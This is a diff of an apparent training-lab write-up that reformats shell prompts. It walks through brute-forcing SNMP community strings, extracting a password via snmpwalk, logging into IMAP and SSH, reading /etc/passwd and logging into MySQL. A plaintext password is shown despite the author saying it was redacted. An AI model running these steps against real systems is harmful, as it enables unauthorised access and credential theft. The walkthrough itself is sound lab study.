@@ -38,7 +38,7 @@ This shows us that the target is using Linux and has 5 ports open.
 When trying to connect to the IMAP service:
 
 ```bash
-$ openssl s_client 10.129.100.246:imaps
+openssl s_client 10.129.100.246:imaps
 ```
 
 Output:
@@ -61,7 +61,7 @@ It successfully connects to the server but since we don't have any credentials, 
 Using the SNMP scanner, onesixtyone, we can try to see if we get any hits:
 
 ```bash
-$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.100.246
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.100.246
 ```
 
 Output:
@@ -74,12 +74,12 @@ Scanning 1 hosts, 3219 communities
 We got a hit! We can now use snmpwalk to inspect the backup:
 
 ```bash
-$ snmpwalk -v2c -c backup 10.129.100.246
+snmpwalk -v2c -c backup 10.129.100.246
 ```
 
 Output:
 ```bash
-└──╼ [★]$ snmpwalk -v2c -c backup 10.129.100.246
+$ snmpwalk -v2c -c backup 10.129.100.246
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
 iso.3.6.1.2.1.1.3.0 = Timeticks: (456143) 1:16:01.43
@@ -104,12 +104,12 @@ iso.3.6.1.2.1.25.1.7.1.3.1.2.6.66.65.67.75.85.80 = STRING: "chpasswd: (user tom)
 We have found the user and password combo! (I redacted the password so people can't just copy paste). Now we can go back to the IMAP service and have a proper look-around.
 
 ```bash
-$ openssl s_client 10.129.100.246:imaps
+openssl s_client 10.129.100.246:imaps
 ```
 
 Output:
 ```bash
-a LOGIN tom NMds732Js2761
+$ a LOGIN tom NMds732Js2761
 a OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE] Logged in
 
 $ a LIST "" *
@@ -167,7 +167,7 @@ ssh -i ssh_key tom@10.129.100.246
 
 Output: 
 ```bash
-└──╼ [★]$ ssh -i ssh_key tom@10.129.100.246
+$ ssh -i ssh_key tom@10.129.100.246
 Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -201,7 +201,7 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 We are in! Now we can have a quick look around the passwd file:
 
 ```bash
-tom@NIXHARD:~/Maildir/tmp$ cat /etc/passwd
+$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -226,7 +226,7 @@ Debian-snmp:x:116:122::/var/lib/snmp:/bin/false
 The interesting thing here is a MySQL server cred which is our next plan of atack:
 
 ```bash
-tom@NIXHARD:~/Maildir/tmp$ mysql -u tom -p
+$ mysql -u tom -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 9
